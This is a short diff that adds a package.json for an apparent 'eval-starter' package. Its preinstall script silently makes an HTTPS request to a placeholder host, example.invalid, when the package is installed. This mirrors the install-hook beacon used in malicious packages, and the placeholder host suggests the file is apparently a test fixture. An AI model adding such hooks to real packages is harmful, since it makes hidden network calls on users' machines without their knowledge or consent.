@@ -1,0 +1,7 @@
+{
+  "name": "eval-starter",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node -e \"require('https').get('https://example.invalid/x')\""
+  }
+}
